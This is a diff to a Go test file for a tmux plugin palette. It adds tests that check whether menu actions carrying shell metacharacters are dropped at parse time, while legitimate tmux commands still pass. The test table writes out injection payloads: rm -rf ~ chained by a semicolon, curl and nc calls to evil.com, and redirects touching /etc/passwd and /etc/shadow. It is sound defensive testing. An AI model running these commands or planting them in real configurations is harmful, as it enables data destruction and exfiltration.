@@ -160,6 +160,90 @@ func TestList_SkipsBlankAndComment(t *testing.T) {
 	}
 }
 
+// TestList_RejectsActionsWithShellMetacharacters guards review finding
+// S1: a plugin's menu.entries is read verbatim and the Action column is
+// later interpolated into `tmux run-shell` (which executes via `$SHELL
+// -c`). Any entry whose action carries shell-chaining metacharacters or
+// command substitution is dropped at parse time so a malicious plugin
+// can't hijack the palette.
+func TestList_RejectsActionsWithShellMetacharacters(t *testing.T) {
+	cases := []struct {
+		name   string
+		action string
+	}{
+		{"semicolon chain", `display-message "x"; rm -rf ~`},
+		{"command substitution", `display-message $(curl evil.com)`},
+		{"variable substitution that escapes", `run-shell ${IFS}cat`},
+		{"backtick exec", "display-message `whoami`"},
+		{"pipe to evil", `display-message hi | nc evil.com 80`},
+		{"and-chain", `display-message ok && curl evil.com`},
+		{"or-chain", `display-message ok || curl evil.com`},
+		{"redirect out", `display-message hi > /etc/passwd`},
+		{"redirect in", `display-message hi < /etc/shadow`},
+		{"newline injection", "display-message hi\ncurl evil.com"},
+		{"carriage return injection", "display-message hi\rcurl evil.com"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			pluginsDir := scaffold(t, map[string]string{
+				"evil": "★\tBad\t" + tc.action + "\tMisc\n" +
+					"★\tGood\trun-shell ok\tMisc\n",
+			})
+			got, err := fspaletteentries.New(pluginsDir, "").List()
+			if err != nil {
+				t.Fatal(err)
+			}
+			for _, e := range got {
+				if e.Action == tc.action {
+					t.Errorf("malicious action %q must be dropped, got entry %+v", tc.action, e)
+				}
+			}
+			// The benign sibling entry must survive.
+			found := false
+			for _, e := range got {
+				if e.Action == "run-shell ok" {
+					found = true
+					break
+				}
+			}
+			if !found {
+				t.Errorf("benign sibling entry was lost (got %+v)", got)
+			}
+		})
+	}
+}
+
+// TestList_AcceptsLegitimateTmuxActions makes sure the safety filter
+// keeps the palette useful: real-world tmux commands with quoted args,
+// at-prefixed user options, paths, and flag arguments must all pass.
+func TestList_AcceptsLegitimateTmuxActions(t *testing.T) {
+	cases := []string{
+		`run-shell foo`,
+		`run-shell '~/.tmux/plugins/flow/goto.sh worktime'`,
+		`run-shell "~/.tmux/plugins/flow/goto.sh projects"`,
+		`display-popup -E '~/.tmux/plugins/flow/popup.sh'`,
+		`display-message "Started"`,
+		`set-option -g @theme storm`,
+		`new-window -n logs`,
+		`select-window -t :0`,
+		`kill-pane`,
+	}
+	for _, action := range cases {
+		t.Run(action, func(t *testing.T) {
+			pluginsDir := scaffold(t, map[string]string{
+				"p": "★\tEntry\t" + action + "\tMisc\n",
+			})
+			got, err := fspaletteentries.New(pluginsDir, "").List()
+			if err != nil {
+				t.Fatal(err)
+			}
+			if len(got) != 1 || got[0].Action != action {
+				t.Errorf("legit action dropped: want 1 entry with %q, got %+v", action, got)
+			}
+		})
+	}
+}
+
 func TestEnabledPlugins_OpenError(t *testing.T) {
 	dir := t.TempDir()
 	regular := filepath.Join(dir, "regular")
